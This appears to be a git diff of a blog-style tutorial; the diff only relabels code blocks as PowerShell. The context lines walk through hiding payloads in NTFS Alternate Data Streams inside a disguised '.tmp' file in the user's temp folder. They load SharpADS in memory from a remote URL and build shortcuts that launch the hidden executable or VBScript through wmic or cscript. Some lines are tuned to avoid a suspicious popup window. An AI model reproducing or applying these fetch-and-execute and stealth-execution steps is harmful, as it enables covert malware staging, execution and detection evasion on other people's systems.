@@ -62,7 +62,7 @@ The code is quite straightforward but I would like to explain some parts of it.
 
 The file will be created with the value of the hostname variable and with the extension ".tmp". This is because it will be stored in the user's temporary folder, where there are many files with the same extension:
 
-```
+```powershell
 $Dir = "$($env:USERPROFILE)\Appdata\Local\temp"
 $File = "$($env:COMPUTERNAME).tmp"
 ```
@@ -71,7 +71,7 @@ $File = "$($env:COMPUTERNAME).tmp"
 
 To make the process simpler I used SharpADS, which can be loaded in memory because it is coded in C#, but you can just use Powershell. To load the file in memory you can use:
 
-```
+```powershell
 $bytes = (New-Object System.Net.WebClient).DownloadData("$Url/$SharpADS")
 $assembly = [System.Reflection.Assembly]::Load($bytes)
 $entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
@@ -80,7 +80,7 @@ $entryPointMethod.Invoke($null, (, [string[]] ('clear', "$Dir\$File")))
 
 Next, you can use it to create an Alternate Data Stream which in this case will contain the bytes of the icon file:
 
-```
+```powershell
 $entryPointMethod.Invoke($null, (, [string[]] ('write', "$Dir\$File","$ADSico","$Url/$IcoFile")))
 ```
 
@@ -101,21 +101,21 @@ wmic process call create C:\path\file.tmp:ADS.exe
 ```
 Translated to the Powershell shortcut creation, we would set the following values in a shortcut object $Shortcut: 
 
-```
+```powershell
 $Shortcut.TargetPath = "wmic"
 $Shortcut.Arguments = "process call create $Dir\$File`:$ADSexe"
 ```
 
 This works but there is a window popping up which looks suspicious. It can be improved if the parameter "/output:CLIPBOARD" is added:
 
-```
+```powershell
 $Shortcut.TargetPath = "wmic"
 $Shortcut.Arguments = "/output:CLIPBOARD process call create $Dir\$File`:$ADSexe"
 ```
 
 After many tests, the best alternative I found (for now) is using again the VBScript, but this time calling it with cscript in TargetPath and the file in the Arguments parameter:
 
-```
+```powershell
 $Shortcut.TargetPath = "cscript"
 $Shortcut.Arguments = "$Dir\$File`:$ADSvbs"
 ```
